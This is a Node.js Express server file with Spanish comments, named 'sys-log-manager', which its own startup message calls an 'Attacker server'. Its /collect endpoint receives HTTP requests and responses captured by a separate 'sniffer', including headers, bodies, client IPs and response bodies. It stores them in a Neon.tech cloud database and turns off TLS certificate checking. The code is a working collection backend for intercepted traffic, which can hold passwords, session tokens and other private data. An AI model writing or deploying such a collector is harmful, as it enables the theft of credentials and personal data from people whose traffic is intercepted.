const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg');
require('dotenv').config();

const app = express();
const PORT = 4000;

if (!process.env.DATABASE_URL || process.env.DATABASE_URL === 'tu_conexion_de_neon_aqui') {
    console.error('\x1b[31m[ERROR] No se encontró la variable DATABASE_URL en el archivo .env\x1b[0m');
    console.error('Asegúrate de haber creado el archivo .env dentro de sys-log-manager con tu conexión de Neon.tech');
    process.exit(1);
}

// Configuración de la conexión a Neon.tech
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false, // Permite certificados autofirmados de Neon
  },
  max: 10, // Optimización para el pool
  idleTimeoutMillis: 30000,
});

app.use(bodyParser.json());

app.post('/collect', async (req, res) => {
    const data = req.body;
    
    console.log('\x1b[41m\x1b[37m[COLLECTOR] DATA RECEIVED FROM SNIFFER:\x1b[0m');
    console.log(`Intercepted ${data.method} ${data.url} → ${data.statusCode ?? 'REQ-ONLY'}`);

    try {
        // Guardar el request Y la response en la base de datos Neon
        const query = `
            INSERT INTO sniffed_data
                (timestamp, method, url, headers, body, client_ip, status_code, response_body)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
        `;
        const values = [
            data.timestamp,
            data.method,
            data.url,
            JSON.stringify(data.headers),
            JSON.stringify(data.body),
            data.clientIp,
            data.statusCode   ?? null,
            JSON.stringify(data.responseBody ?? null),
        ];

        await pool.query(query, values);
        console.log('\x1b[32m[DB] Packet (req+res) stored in Neon.tech cloud database.\x1b[0m');
        
    } catch (err) {
        console.error('\x1b[31m[DB ERROR] Failed to save to Neon.tech:\x1b[0m', err.message);
    }

    console.log('--------------------------------------------------');
    res.status(200).send('OK');
});

// Verificar conexión inicial a la DB
pool.connect((err, client, release) => {
  if (err) {
    return console.error('\x1b[31m[COLLECTOR] Error connecting to Neon.tech:\x1b[0m', err.stack);
  }
  console.log('\x1b[32m[COLLECTOR] Successfully connected to Neon.tech database.\x1b[0m');
  release();
});

app.listen(PORT, () => {
    console.log(`\x1b[36m[SYS LOG MANAGER] Attacker server listening on port ${PORT}\x1b[0m`);
    console.log(`[SYS LOG MANAGER] Monitoring incoming data and forwarding to Neon.tech...`);
});
